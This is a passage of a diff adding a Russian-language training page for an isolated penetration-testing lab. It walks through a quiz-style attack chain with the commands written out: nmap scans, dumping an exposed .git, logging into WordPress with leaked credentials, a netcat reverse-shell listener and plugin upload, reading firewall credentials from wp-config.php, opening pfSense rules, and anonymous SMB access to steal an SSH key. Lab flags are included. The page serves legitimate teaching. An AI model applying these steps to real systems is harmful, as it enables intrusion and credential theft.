+<div><h4>КОМАНДА</h4><ul><li>Горбик Александр</li><li>Клиндухов Ярослав</li><li>Науч. рук.: Белоусова Е. С.</li></ul></div>
+</div>
+<div class="bot"><span>● ИЗОЛИРОВАННЫЙ СТЕНД</span><span class="ag">&gt; ПРОХОЖДЕНИЕ НАЧИНАЕТСЯ С OPENVPN_</span><span>4 ВМ</span></div></footer>
+
+<script>
+(function(){
+var ART={"globe": ["0000033300000", "0003302033000", "0030002000300", "0302002002030", "0302002002030", "3002002002003", "3222222222223", "3002002002003", "0302002002030", "0302002002030", "0030002000300", "0003302033000", "0000033300000"], "gear": ["000000333000000", "000000333000000", "003303333303300", "003333222333300", "000322222223000", "003322000223300", "333220000022333", "333220000022333", "333220000022333", "003322000223300", "000322222223000", "003333222333300", "003303333303300", "000000333000000", "000000333000000"], "shield": ["333333333333333", "311111111111113", "311111111111113", "311111111111113", "311111111111113", "311111111111113", "311111131111113", "311111333111113", "311111131111113", "031111131111130", "003111131111300", "000311111113000", "000031111130000", "000003111300000", "000000313000000", "000000030000000", "000000030000000"], "brackets": ["000030000230000", "000300000203000", "003000002000300", "030000002000030", "300000020000003", "300000020000003", "030000200000030", "003000200000300", "000302000003000", "000032000030000"], "server": ["1111111111", "1211111121", "1111111111", "0000000000", "1111111111", "1211111121", "1111111111", "0000000000", "0010000100"], "wall": ["1111011111", "1111011111", "0000000000", "1011111011", "1011111011", "0000000000", "1111011111", "1111011111", "0000000000", "1011111011"], "list": ["2201111111", "2200000000", "2201111100", "0000000000", "2201111111", "2200000000", "2201111100", "0000000000", "2201111111"], "eye": ["0000000000", "0011111100", "0110000110", "1100220011", "1100220011", "0110000110", "0011111100"], "check": ["0000000011", "0000000110", "0000001100", "1000011000", "1100110000", "0111100000", "0011000000"]};
+function art(el){var R=ART[el.dataset.a],n=R[0].length,dk=el.dataset.d,C=dk?{1:'#4d8bff',2:'#8fd3ff',3:'#fff'}:{1:'var(--pu)',2:'#2a9df4',3:'var(--fg)'},h='';
+ R.forEach(function(r,y){for(var i=0;i<n;i++){var v=r[i];h+='<i style="animation-delay:'+(i+y)*110+'ms;'+(v==='0'?'':'background:'+C[v])+'"></i>'}});
+ el.innerHTML='<div class="pxa" style="grid-template-columns:repeat('+n+',1fr);width:'+el.dataset.w+'px;aspect-ratio:'+n+'/'+R.length+'">'+h+'</div>'}
+window.ART_RENDER=art;
+document.querySelectorAll('[data-a]').forEach(art);
+var PAL=['#003386','#0b4fd6','#4d8bff','#8fd3ff','#cfe6ff'];
+document.querySelectorAll('[data-strip]').forEach(function(el){var cols=96,rows=4,rev=el.dataset.strip==='r',h='';
+ el.style.gridTemplateColumns='repeat('+cols+',1fr)';
+ for(var y=0;y<rows;y++)for(var x=0;x<cols;x++){var p=(rev?cols-1-x:x)/cols;p=p*p*(1.1-y*.18);
+  h+='<i style="animation-delay:-'+(Math.random()*3000|0)+'ms;'+(Math.random()<p?'background:'+PAL[Math.floor(Math.random()*5)]:'')+'"></i>'}
+ el.innerHTML=h});
+var TC=document.querySelectorAll('.strip i');
+setInterval(function(){for(var k=0;k<14;k++){var e=TC[Math.floor(Math.random()*TC.length)];e.style.background=e.style.background?'':PAL[Math.floor(Math.random()*5)]}},180);
+var TM={"chars": "ABCDEFGHIJKLMNOPQRSTUVWXZ", "pal": [["#ffffff", "#fdfcfa", "#f7f0ee", "#fdded0", "#e3dcd6", "#e2c4b6", "#e9a794", "#de9076", "#d37c5b", "#c66e43", "#9e8b74", "#916a55", "#af562e", "#92522d", "#6b4b35", "#3d486a", "#773316", "#720f0c", "#3c282f", "#273443", "#23293a", "#1e1e29", "#19171f", "#0c080c", "#080e24"], ["#f2eae1", "#e4d0bf", "#d5c2b3", "#d2b8a6", "#cab5a4", "#c1b3aa", "#caac9f", "#bdab9d", "#cd9484", "#b6a79d", "#a7a4a5", "#9c8f92", "#b87973", "#a57770", "#997874", "#976b6a", "#7d7782", "#81686f", "#5e6c88", "#835863", "#635a6e", "#515874", "#3c4a6e", "#192145", "#080e24"], ["#fffbe0", "#fff5cd", "#ffeec5", "#ffe0ba", "#fde9c3", "#d2e5ec", "#fcd2ac", "#f9c6a2", "#f2b88f", "#cfc7c3", "#dcb298", "#a1c0e5", "#e6a782", "#d2a585", "#d29a77", "#cd8b67", "#b29579", "#8599bd", "#9c7b65", "#926644", "#815134", "#5d504e", "#552f1d", "#271712", "#080e24"]], "rows": [["..................ZZZ.ZZZ...............", "...............ZZZKLLZLKLZZ.............", "..............ZKFHJQOKHJJKLZ............", ".............ZKFJQROWXSOMQMKZ...........", ".............ZDJNRNOXSWOQMRNKZ..........", "............ZDINQMNRSLQLOQMRNKZ.........", "...........ZFGNNJNQQNJJNJRONRNZ.........", "...........ZFILLJQQMNIHJMNRNQQLZ........", "..........ZLDHNKMNJMJIHHMNRQQQNZ........", "..........ZKDKNINNMMHHGHJNQRQQNZ........", "..........ZKCKJJNINIGGGGGIQRQQQLZ.......", "..........ZKDKKLGGFFGFGHIJNRRQQOZ.......", "..........ZKFLLHLLHGGGMRONMQWRQOZ.......", "..........ZKFQGCKNNFFMRNKLJIMWQOZ.......", "..........ZKFLCFKSRGDMRNNRQIHQRQZ.......", "...........ZFFBFDGICFMMMHGHIHNRQZ.......", "...........ZLCBDDGDADIMJHIIIINQJZ.......", "............ZBBDFGGCGMNMHHIJJJNKZ.......", "............ZCBDDGGGGQQJGHJJMJMLZ.......", "............ZFADDGGDDHMIHHIJMMGLZ.......", "............ZEACDFDCFHHIJJJJJNKZ........", "............ZFCCDDFIMQMQMJJJIWZ.........", ".............ZFBCDFDGIJNMJJILUZ.........", ".............ZOACDDDHHIMMJJJNSZ.........", "..............ZEBDDFGGIJMJMJLZ..........", "..............ZKADCCDGIJMMNMLZ..........", "..............ZLADDCFHIMMMMJLZ..........", "..............ZLACDDGJJMNMMJLZ..........", "..............ZFACDDFHIMMMJJLZ..........", ".............ZOEACDDDGHJJJJMLFZ.........", "............ZZKEFADDDFHIJJJNFEVZ........", "...........ZLUKBKFCDDFGIIILGEESSZ.......", ".........ZZPPXEACKKFDFGHHKFFFCVXVZZ.....", "......ZZZOTPPXEAAAFOKGGHKEEGFEWXWWWZZZ..", "...ZZZOSUVTPTXFABAACKOKGCEFFEEXXWWWWVUZ.", ".ZZSSSVTTTPPVTEBAABACAEBAFFFCFXXWVVWWWVZ", "ZOSSUUUVUTTPVPCBABAKOLSSEEFEBKXWWWWWWWVZ", "ZTTUVUVUVTTPUTCBBAFXRRXXLCEEBKXWWWWXWVVZ", "ZTTTUVUUTTTPUUABAELGMRXFCEEECKXWWWWWWVVZ", "ZTTPUXTUUTTPUWCAAECEXSFCCCEEATXWWWWWVWVZ", "ZPTPTXTUUTTPTXEABAAOXSCECCCCBWXWWWLTWWVZ", "ZPUPTXUTUTTPPXFABAERRXKAEBEBEXWWWWVTWXVZ", "ZTUPPXVTTTTPPXKABAKRRXLAEBCAKXWWWWWVWXVZ", "ZTUPPXWTTTTPPXLABAORRRSACBBALXWWWWVVXWVZ", "ZTTPPXWTTTTPPXPAABSRRRSBCBBBUXWWWVVWXVVZ", "ZTTPPXVTTTTPPVUAAERRRRSBCBAEXWWWWVUWWVVZ", "ZTTPPWVTTTTPPUXCAERRRRSCCCAKXWWWWVVXWVVZ", "ZTTPPWUTTTTPPTXEAFRRRRSCBCALXWWVVVWXVVWZ", "ZTTKPVUTTTPPPPXFAKRRRRSCBCAUXWWVVVWWVVWZ", ".ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ."], ["........................................", ".................ZZZZZZZZZZ.............", "...............ZZLKKUUQSUUWZ............", ".............ZZSKKQSSSSSSQFFZ...........", "............ZSKKLSSSSVVSVWVQLZ..........", "............ZKKSSSSSSSVSSSVVSLZ.........", "...........ZSKSSSSSSSVVSSSVVVQKZ........", "...........ZFQSSSSSVSVVVVVSVVSLLZ.......", "...........ZFQSVVVVSSSVSVVVVWVSKQZ......", "...........ZKVSVVVVSVSVVVVSWVQSQFZ......", "...........ZKWVVQURQUVVVVWVVSRSSLZ......", "...........ZKWWSQQOORRVUUWWVVSSVLTZ.....", "...........ZLSWLLROLOORUURWROUVVLHZ.....", "...........ZSVSCRUUURONONGQVOUVULZ......", "...........ZVSKHRQRURONNORUUQUWULZ......", "............ZOFOUUWVVOIMUUPMIRVQOZ......", "...........ZPIFPRRRUUNIIWWRQNCSQRZ......", "...........ZMIKNNMNPONIDPUQQPDLQZ.......", "...........ZMLJMMMMPOMIIIMMIIDMPZ.......", "...........ZMMFMMMTTOOIGMMMIIBMMZ.......", "...........ZNIJLNPTRTTTTNPIIIDMMZ.......", "............ZDLNOTRNONIIITMIGIIZ........", "............ZTGNPPOORPIIGPNIIGIZ........", ".............ZGMMPTTUTTTIMPIIDPZ........", ".............ZGMNPNMPTMNPNMIGIZ.........", ".............ZHINNNNPTNIIMIIDZ..........", ".............ZOIPNNNNMMMIIMDLZ..........", ".............ZRGPNPNMMIIIIIDZ...........", ".............ZRGPOOPPPMMIMMDZ...........", ".............ZOHOPPRUTTNMNIBZ...........", ".............ZCNNOPTTRPNNMMDZ...........", ".............ZAOTOOPTTTPNMMAZZ..........", "..........ZZZQBCKTTPTTTNPMAASQZZ........", ".......ZZZQFKWCFCFPTTTPPIAACXKAKZZZ.....", ".....ZZQFCFJVXLBFCBFPPPHAAAQXVABACRZZ...", "...ZZKBCJLLHVXWBCDBAUWJAAAAWXQALCBAALZZ.", ".ZZCAFJJJHJCQWULBCBXXXXCAAKWWKCHBHGCAALZ", "ZJAFJJHGGEFDKWKWBBXXXWXXAAUSSJGBDGCGGCAZ", "ZFJJHFFEGFEDJXLXKFXXXXUWQAWLUDBBHBDDDEEZ", "ZJJFJFEFEEEEBQWSXUUWXXAJUQWQQBBHDBGDCHDZ", "ZHHEHHDFEEEFCEWSWURXXVAFLXLQFBEHBCGCCHBZ", "ZHGHHJEEFEEEEBWSVQUXXXFDEWFUBCHDBDEBDGBZ", "ZHDJJJFHFFFEFBLXXWWXXXQBOWWQBEECBGCBEDBZ", "ZFDJJJHHHHEEECHXXWXXXXQCUWXKBEDCCGCBGCBZ", "ZFEJJHHHHHFFEEEUXWXXXXUJWWWCDEDCEEBBGCAZ", "ZFHJJJJHHHFFEECLXWXXXXRLWWVBEDCCEDBBECBZ", "ZFJJJJJJHHHFEFCEXXWXXXUOWXQBGDDDECCCDBBZ", "ZJLJJJJJJHHHFHDGUXXXXXWRXXJBEDDEDCCCCBBZ", "ZJJJJJJJJJHHHHEHRXLWXXWUSWFCGEEEDCCCCBBZ", ".ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ."], [".....................ZZZZZZ.............", "..................ZZZQQQQQQZZZ..........", ".................ZJKSSUWWUQHERZ.........", "...............ZZJQUTUWWXWWTPBAZ........", "..............ZSEQSUUUVWWXXWUSNBZ.......", ".............ZJKVWUWUNSWWWWWWUSSJZ......", "............ZJQWWNQWWWVWXXWUUTTTPZ......", "...........ZJNWUKAEOTUWWWWWWWUTUUQZ.....", "...........ZDSWQACBAAAGPTWWVWWTQUPZ.....", "..........ZQKWWABECEEECDHPWWVWXTSTSZ....", "..........ZQDUSADDDGGGGHHHPWWUXXUTQZ....", "..........ZKJUKBGGGGGHIIIHGMUWWWWUSZ....", "..........ZJJTJEDGGHGHDBCDDHMUXWWUTZ....", "..........ZJBSAAABDGGEJQQNQNHPXXXWTTZ...", "..........ZJJSQNSNHIIQUSMHKVNPWWUWUSZ...", "..........ZSRJJANUSHSTTVSUPSIMUXUUTSZ...", "..........ZVJJQVVWTJJSWVVVUSIDOXWWWSZ...", "...........ZFFQSTQPEQOEGDHIGCGMXXUWTZ...", "...........ZJSJADEIAKPBEECGEDGMUWWTQZ...", "............ZQEEDHGACPPEDHHHIHOPWTPSZ...", ".............ZAGMPNHSQTMMMIIMIIOPCTZ....", ".............ZAGKISUUWOIIMMMMIIMKVWZ....", ".............ZQBIDAHIIHIPPOMIIIIVVZ.....", "..............ZEODAJKHGHMPOIIIIHXVZ.....", "..............ZJEMUWUWSSIHMIIIHHXSZ.....", "..............ZSAPNKKJKMOMMIIIHKXSNZ....", "...............ZBHDOPPPMIMMIIIHQXUQZ....", "...............ZJBEINKHGGIIIIOGSXWQZ....", "................ZABAAACGIMMOPPDVXXTZ....", "................ZKEKOOOPPPPSPOGVXXXTZ...", ".................ZBNPPPPSSSSPOGWWXXUZ...", ".......ZZ......ZZQAKKOPPPSPPOMGWWXXPZ...", "....ZZZVVZZZZZZSFAEKHKOPPPOMOMIWWXXWSZ..", "...ZVJFLFFJSVJAAAEDKKKNOPOOMMMMWWVXXUZ..", "...ZALLFLFFAAABCCBDHKKNNOONNOMPXXWXXUZ..", "..ZJFRRFRLJDCBBBBCDHNNNNNNNNOOSXXXWTPJZ.", "..ZFRLLRVLJCBBBBBCDHKNONNNNOOMTXXXWUUDAZ", ".ZALLFRRFLJBBBBBBECDHKONKKOONOSXWWXXXMGZ", "ZJFLFLVRRLJBBBBBBCBCDHNKKKNNIOSWWWXUXOGZ", "ZFLLLRRFLLJCBBBBBBAADGHKKKKIKPSWUWXSPHDZ", "ZFLLLRRFLLJCBBBBBBBABDHIKIKNKNOWUTVXTDDZ", "ZFLRLRRRRLJEBBBBBBBBEEDGIKNKMMIPTWXXWICZ", "ZLLLRRVRLLJEBBBBBBBBBEEEIMKKIIMSWXSUUGJZ", "ZLLLRRFFLLJCBBBBBBBBBBEGDGHHHIHTWUSTMERZ", "ZLLVSALRRLJEBBBAABBBBBADEGGGGHGNTUTUPRRZ", "ZFLVLRVLLLJBAAASQAECCBGDCDDGGHBQXUQTSVRZ", "ZFRVRVLLLLLLRVSXXDBCCCDEDDDDDGBSXWWWVVRZ", "ZFVVRFLLFFFLRRVWRFFFEEBBBCEDDGDGTTXXXVXZ", "ZLVVRFFFFFLFFRLRLLLLLLLLLLFFFFFJWSWTVRRZ", ".ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ."]], "W": 40, "H": 50};
+document.querySelectorAll('[data-p]').forEach(function(el){var i=+el.dataset.p,R=TM.rows[i],P=TM.pal[i],h='';
+ R.forEach(function(r,y){for(var x=0;x<r.length;x++){var c=r[x];h+='<i style="animation-delay:'+(Math.random()*1200|0)+'ms;'+(c==='.'?'':'background:'+P[TM.chars.indexOf(c)])+'"></i>'}});
+ el.innerHTML='<div class="g" style="grid-template-columns:repeat('+R[0].length+',1fr)">'+h+'</div>'});
+var t=document.getElementById('t');
+function tick(){var d=new Date();t.textContent=d.toISOString().slice(11,19)}tick();setInterval(tick,1000);
+var c=document.getElementById('cube'),M=["000000000000000000000000011000000010011001000000","000000000000000000000001111100000011001001100000","000000000000000000000011111100000011001100100000","000000000000000000000111111100000011001100110000","000000000000000000001101111100000011001100100000","000000000000000000011001111100000011001000100000","000000000000000000110001111100000011001001100000","000000000000000001100001111100000010011001000000","000000000000000011000001111100000000000000000000","000000000000000110000001111100000000000000000000","000000000000001100000001111100000000000000000000","000000000000011000000001111100000000000000000000","000000000000110111100001111100001111000001111000","000000000001101111110001111100011111100011111000","000000000011011111110001111100111111100111111100","000000000110011111110001111101111111101111111100","000000001100000111110001111111101111111001111100","000000011000000111110001111111001111110001111100","000001110000000111110001111100001111100001111100","000011100000000111110001111100001111100001111100","000111000000000111110001111100001111100001111100","001110000000000111110001111100001111100001111100","001100000000000111110011111100011111100001111100","011000000000000111110111111100111111100001111100","110000000000000111111111111111101111111001111111","100000000000000111111000111111001111111001111110","000000000000000111110000111110001111110001111100","000000000000000011100000111100000111000000111000"],h='';
+for(var y=0;y<M.length;y++)for(var x=0;x<M[y].length;x++){
+ var on=M[y][x]==='1',col,r=Math.random();
+ if(on)col=r<.12?'#8fd3ff':r<.2?'#cfe6ff':'#ffffff';
+ else{var b=Math.floor(Math.random()*28);col='rgb('+(0+b/3|0)+','+(48+b)+','+(125+b)+')'}
+ h+='<i class="'+(on?'L':'B')+'" style="background:'+col+';animation-delay:'+(on?(x+y)*70:-Math.random()*4000|0)+'ms;animation-duration:'+(on?6000:2000+Math.random()*3000|0)+'ms"></i>';
+}
+c.innerHTML=h;
+})();
+
+(function(){var M=["1111111","1122211","1200021","1200021","1222211","1200011","1200011"],g=[],h='',x,y,dx,dy;
+for(y=0;y<28;y++){g.push([]);for(x=0;x<48;x++)g[y].push(0)}
+M.forEach(function(row,py){for(var px=0;px<7;px++){var t=row[px];if(t==='0')continue;
+for(dy=0;dy<3;dy++)for(dx=0;dx<3;dx++)g[py*4+dy][10+px*4+dx]=[t,(px+py)*90+(dx+dy)*12+(t==='2'?800:0)]}});
+for(y=0;y<28;y++)for(x=0;x<48;x++){var c=g[y][x];
+if(c){var f=c[0]==='1',d=c[1];h+='<i class="'+(f?'F':'W')+'" style="background:'+(f?'#1f5fff':'#fff')+';animation-delay:'+d+'ms'+(f?','+(d+1400)+'ms':'')+'"></i>'}
+else{var b=Math.floor(Math.random()*28);h+='<i class="B" style="background:rgb('+(6+b/4|0)+','+(16+b/2|0)+','+(46+b*1.2|0)+');animation-delay:-'+(Math.random()*4000|0)+'ms;animation-duration:'+(2000+Math.random()*3000|0)+'ms"></i>'}}
+document.getElementById('plogo').innerHTML=h})();
+
+/* --- Пошаговое обучение --- */
+(function(){
+  const root = document.getElementById("lroot");
+  if(!root) return;
+  const ICONS=["server","shield","wall","gear","check"];
+  const GROUPS = [
+   {g:"Разведка и подключение", items:[
+    {t:"Подключение к лаборатории", c:"У вас есть файл pentester.ovpn. Как подключить Kali к учебной сети, чтобы увидеть целевые машины?",
+     q:"Какая команда поднимет VPN-туннель из профиля pentester.ovpn?", w:"sudo openvpn --client pentester.ovpn",
+     h:"Команда — это sudo + имя VPN-программы + путь к .ovpn-файлу, без лишних флагов.", cmd:"sudo openvpn pentester.ovpn",
+     e:"Запускает OpenVPN-клиент и поднимает туннель (интерфейс tun0) до лабораторной сети — без него Kali не увидит цель."},
+    {t:"Проверка доступности цели", c:"Туннель поднят. Как убедиться, что хост 10.10.10.10 доступен, прежде чем сканировать порты?",
+     q:"Какой командой проверить, что хост отвечает?", w:"traceroute 10.10.10.10",
+     h:"Четыре буквы, привычные ещё с 90-х — так называют «пропинговать» хост.", cmd:"ping 10.10.10.10",
+     e:"Отправляет ICMP-пакеты на целевой IP и подтверждает, что хост отвечает."},
+    {t:"Сканирование целевого хоста", c:"Хост отвечает. Какой командой nmap быстро получить версии служб, ОС и стандартный сбор информации?",
+     q:"Какая команда даёт агрессивное сканирование с определением версий и ОС?", w:"nmap -sS 10.10.10.10",
+     h:"Один инструмент, три однобуквенных флага подряд.", cmd:"nmap -A -sV -sC 10.10.10.10",
+     e:"-A — агрессивное сканирование (ОС, трассировка); -sV — версии служб; -sC — стандартные скрипты Nmap. Результат покажет веб-порт 8080 и каталог .git, доступный публично."}
+   ]},
+   {g:"Сегмент 1 · DMZ (WordPress)", items:[
+    {t:"Проверка WordPress", c:"На порту 8080 веб-приложение. Как убедиться, что это именно WordPress и панель администратора доступна?",
+     q:"Какой адрес откроет панель входа WordPress?", w:"http://10.10.10.10:8080/phpmyadmin/",
+     h:"Путь панели входа у этой CMS всегда один и тот же, независимо от сайта.",
+     cmd:"http://10.10.10.10:8080/wp-admin/",
+     e:"Открыв этот адрес в браузере, вы подтверждаете, что сайт на WordPress, а панель входа доступна снаружи."},
+    {t:"Утечка через .git", c:"Nmap показал, что каталог .git доступен по HTTP. Чем это опасно?",
+     q:"Какой адрес указывает на открытый каталог системы контроля версий?", w:"http://10.10.10.10:8080/.svn/",
+     h:"Папка системы контроля версий начинается с точки — такие папки обычно скрыты от посторонних.",
+     cmd:"http://10.10.10.10:8080/.git/",
+     e:"Публично доступный .git означает, что весь исходный код и история коммитов сайта могут быть скачаны — включая случайно закоммиченные секреты."},
+    {t:"Скачивание репозитория", c:"Вы знаете, что .git открыт. Какой утилитой восстановить проект локально по этому адресу?",
+     q:"Чем правильнее всего восстановить открытый .git в локальный репозиторий?", w:"wget -r http://10.10.10.10:8080/.git/",
+     h:"Название утилиты говорящее — она в буквальном смысле «сливает» .git.",
+     cmd:"pipx run --spec git-dumper git-dumper http://10.10.10.10:8080/.git/ ~/dmz-git",
+     e:"git-dumper скачивает все доступные файлы из .git на сервере и восстанавливает структуру проекта в папке ~/dmz-git."},
+    {t:"История коммитов", c:"Репозиторий скачан локально. Как посмотреть список коммитов, не переходя в саму папку?",
+     q:"Какая команда покажет историю коммитов репозитория ~/dmz-git?", w:"git -C ~/dmz-git status",
+     h:"git log, только нужно явно указать путь к репозиторию — флагом -C.", cmd:"git -C ~/dmz-git log --oneline",
+     e:"Показывает историю коммитов в сжатом виде (хэш + сообщение) для репозитория в ~/dmz-git."},
+    {t:"Содержимое последнего коммита", c:"Вы видите список коммитов. Как посмотреть, что именно изменилось в последнем (HEAD)?",
+     q:"Какая команда покажет содержимое последнего коммита?", w:"git -C ~/dmz-git diff",
+     h:"HEAD — это просто псевдоним самого последнего коммита.", cmd:"git -C ~/dmz-git show HEAD",
+     flag:"-lovelyboy2007",
+     e:"Выводит содержимое последнего коммита — в нём случайно оказались учётные данные администратора WordPress."},
+    {t:"Вход в WordPress", a:1, c:"В последнем коммите найдены логин и пароль администратора. Что делать дальше?",
+     q:"Что логичнее всего сделать с найденными учётными данными?", w:"Сбросить пароль через «Lost your password?»",
+     h:"Для чего вообще нужны логин и пароль от панели управления?",
+     cmd:"Откройте http://10.10.10.10:8080/wp-admin/ и войдите под найденными учётными данными.",
+     e:"Теперь у вас есть доступ администратора к WordPress — это открывает возможность установить произвольный код через плагин."},
+    {t:"Подготовка слушателя", c:"Вы собираетесь загрузить плагин с обратной оболочкой. Что нужно запустить на Kali ДО его активации?",
+     q:"Какая команда поднимет слушатель на порту 4444?", w:"nc 10.10.10.10 4444",
+     h:"Netcat, три однобуквенных флага (listen, verbose, no-dns) и номер порта.", cmd:"nc -lvnp 4444",
+     e:"-l — режим прослушивания, -v — подробный вывод, -n — не резолвить DNS, -p — порт. Netcat ждёт входящее соединение на порту 4444 от будущего reverse shell."},
+    {t:"Загрузка reverse-shell плагина", a:1, c:"Слушатель запущен. На рабочем столе Kali уже лежит файл range-reverse.zip. Как получить shell на машине WordPress через панель администратора?",
+     q:"Какой путь в wp-admin доставит и запустит этот плагин?", w:"Settings → General → вставить shell.php вручную",
+     h:"В WordPress плагин можно не только искать в каталоге, но и ставить вручную из zip-файла.",
+     cmd:"В wp-admin: Plugins → Add Plugin → Upload Plugin → выбрать range-reverse.zip → Install Now → Activate Plugin → нажать «Connect» на странице плагина Range Reverse.",
+     e:"После активации и нажатия «Connect» плагин инициирует исходящее соединение с вашим nc-слушателем — вы получаете интерактивный shell на сервере WordPress."},
+    {t:"Поиск учётных данных firewall", c:"У вас есть shell на машине WordPress. Где CMS обычно хранит учётные данные для сторонних сервисов, и как найти в этом файле упоминания firewall?",
+     q:"Какая команда найдёт упоминания firewall в конфиге WordPress?", w:"cat /etc/passwd",
+     h:"grep с регуляркой ищет ключевые слова прямо внутри файла конфигурации CMS.",
+     cmd:'grep -nE "FIREWALL (URL|USER|PASS)" /var/www/html/wp-config.php',
+     flag:"nu_i_nu_ti_hacker",
+     e:"Ищет в wp-config.php строки с URL/USER/PASS для firewall — так находятся учётные данные к межсетевому экрану pfSense."}
+   ]},
+   {g:"Межсетевой экран · pfSense", items:[
+    {t:"Вход в pfSense", a:1, c:"У вас есть адрес, логин и пароль firewall. Что дальше?",
+     q:"Как попасть в управление pfSense?", w:"Подключиться по SSH на 10.10.10.1",
+     h:"Логин и пароль, которые вы только что нашли, больше нигде не пригодятся.",
+     cmd:"Откройте http://10.10.10.1 в браузере и войдите с найденными логином и паролем.",
+     e:"pfSense — дистрибутив на FreeBSD для межсетевого экрана и маршрутизатора. Получив доступ к его веб-панели, вы можете менять правила трафика между сегментами сети."},
+    {t:"Открытие маршрута между сегментами", a:1, c:"Сейчас сегмент DMZ не видит внутреннюю сеть. Что нужно изменить в pfSense, чтобы открыть путь из сегмента 1 во внутренний сегмент 2?",
+     q:"Где в pfSense меняются правила прохождения трафика между сетями?", w:"Interfaces → добавить новый VLAN",
+     h:"Ищите раздел именно про правила трафика, а не про сами сетевые интерфейсы.",
+     cmd:"В разделе Firewall → Rules разрешите трафик из сегмента DMZ во внутренний сегмент.",
+     e:"После изменения правила трафик из вашей текущей сети получает доступ к внутренним подсетям 10.10.20.0/24 и 10.10.30.0/24."}
+   ]},
+   {g:"Сегмент 2 · Internal (SMB → GitLab)", items:[
+    {t:"Маршруты до внутренних подсетей", c:"Доступ к сегментам 10.10.20.0/24 и 10.10.30.0/24 открыт на firewall. Как сказать вашей Kali отправлять трафик к этим сетям через VPN-интерфейс?",
+     q:"Какая команда добавит статический маршрут через tun0?", w:"sudo ip addr add 10.10.20.0/24 dev tun0",
+     h:"ip route, подкоманда replace, подсеть и имя VPN-интерфейса в конце.", cmd:"sudo ip route replace 10.10.30.0/24 dev tun0\nsudo ip route replace 10.10.20.0/24 dev tun0",
+     e:"Говорит Kali: весь трафик к этим подсетям отправлять через VPN-интерфейс tun0, который ведёт в сеть DMZ."},
+    {t:"Сканирование внутренних подсетей", c:"Маршруты добавлены. Как найти живые хосты и открытые сервисы в обеих подсетях?",
+     q:"Как правильно просканировать обе подсети nmap'ом?", w:"nmap -A -sV -sC 10.10.20.0/24,10.10.30.0/24",
+     h:"Те же три флага, что и в самом первом сканировании — просто адрес теперь шире.",
+     cmd:"nmap -A -sV -sC 10.10.20.0/24\nnmap -A -sV -sC 10.10.30.0/24",
+     e:"Глубокое сканирование всей подсети: живые хосты, открытые порты, версии служб и потенциальные уязвимости."},
+    {t:"Точечная проверка портов", c:"Полное сканирование подсетей заняло много времени. Как быстро проверить конкретные интересные порты (SSH, Telnet, HTTPS, SMB, веб) сразу на нескольких IP?",
+     q:"Какая команда проверит конкретные порты сразу на пяти адресах?", w:"nmap -sS -p- 10.10.20.0/24",
+     h:"Список портов через запятую и список IP тоже можно передать через запятую одной командой.",
+     cmd:"nmap -n -Pn -p 22,23,443,445,8080,80 10.10.20.10,20,30,40,50",
+     e:"-n — не резолвить DNS, -Pn — считать хосты живыми (пропустить ping), -p — только указанные порты. Находятся живые хосты 10.10.20.10 и 10.10.30.20."},
+    {t:"Список сетевых ресурсов (SMB)", c:"На 10.10.20.10 открыт SMB. Как посмотреть доступные сетевые папки без учётных данных?",
+     q:"Какая команда покажет список SMB-шар анонимно?", w:"smbclient //10.10.20.10/public -U admin",
+     h:"Один флаг выводит список ресурсов шары, другой означает пустой пароль.", cmd:"smbclient -L 10.10.20.10 -N -U ''",
+     e:"-L — показать список ресурсов (шар), -N — без пароля, -U '' — анонимный вход."},
+    {t:"Просмотр файлов в шаре", c:"Найдена шара public. Как посмотреть, какие файлы в ней лежат?",
+     q:"Как вывести список файлов внутри шары public?", w:"smbclient -L //10.10.20.10/public",
+     h:"Подключение к шаре плюс флаг -c с обычной командой ls внутри кавычек.", cmd:"smbclient //10.10.20.10/public -N -U '' -c 'ls'",
+     e:"Подключается к папке public анонимно и выводит список файлов."},
+    {t:"Скачивание SSH-ключа", c:"В шаре лежит файл id_rsa_backup. Как скачать его на Kali?",
+     q:"Какая команда скачает id_rsa_backup из шары на Kali?", w:"smbclient //10.10.20.10/public -N -U '' -c 'put id_rsa_backup'",
+     h:"Та же команда, что и в прошлом шаге — просто вместо ls теперь get и имя файла.", cmd:"smbclient //10.10.20.10/public -N -U '' -c 'get id_rsa_backup'",
+     e:"Скачивает файл id_rsa_backup на Kali — это похоже на приватный SSH-ключ."},
+    {t:"Подготовка ключа к использованию", c:"Ключ скачан. Прежде чем SSH согласится его использовать, что нужно проверить и исправить?",
+     q:"Какие права нужно выставить на приватный ключ?", w:"chmod 777 id_rsa_backup",
+     h:"SSH требует права «только для владельца» — есть классическое трёхзначное число для этого.",
+     cmd:"chmod 600 id_rsa_backup\nfile id_rsa_backup",
+     e:"chmod 600 — права на чтение/запись только владельцу (иначе SSH откажется использовать ключ). file — подтверждает тип файла: OpenSSH private key."},
+    {t:"Полное сканирование портов хоста", c:"Известных портов (22, 80, 443, 445…) мало. Как найти вообще все открытые порты на 10.10.20.10, включая нестандартные?",
+     q:"Какая команда найдёт абсолютно все открытые порты хоста?", w:"nmap -sU 10.10.20.10",
+     h:"Не нужно перечислять порты вручную — есть флаг, означающий «все 65535».", cmd:"nmap -n -Pn -p- --open 10.10.20.10",
+     e:"-p- сканирует все 65535 портов, --open показывает только открытые. Находится нестандартный SSH-порт и признаки GitLab."},
+    {t:"Проверка SSH-ключа на GitLab", c:"Найден нестандартный SSH-порт и признаки GitLab. Как проверить, подходит ли найденный ключ для входа пользователем git, не открывая интерактивную сессию?",
+     q:"Какая команда проверит ключ на нестандартном SSH-порту GitLab?", w:"ssh -p 22 root@10.10.20.10",
+     h:"Флаг, отключающий выделение терминала, как раз подходит для быстрой проверки ключа.",
+     cmd:"ssh -T -p 2222 -i id_rsa_backup git@10.10.20.10",
+     e:"-T — без псевдотерминала, -p 2222 — нестандартный порт SSH, -i — использовать найденный ключ, git@… — стандартный пользователь GitLab. Успешный ответ подтверждает, что ключ действителен."},
+    {t:"Подсказка с именем репозитория", c:"Ключ рабочий, но неизвестно, какой приватный репозиторий клонировать. Куда стоит вернуться за подсказкой?",
+     q:"Откуда взять имя приватного репозитория?", w:"cat id_rsa_backup",
+     h:"Загляните туда же, где уже нашёлся один файл — там может быть не только он.",
+     cmd:"smbclient //10.10.20.10/public -N -U '' -c 'get repo_hint.txt'\ncat repo_hint.txt",
+     e:"Скачивает и выводит файл-подсказку — внутри указано имя приватного репозитория gitlab_user/internal-configs.git."},
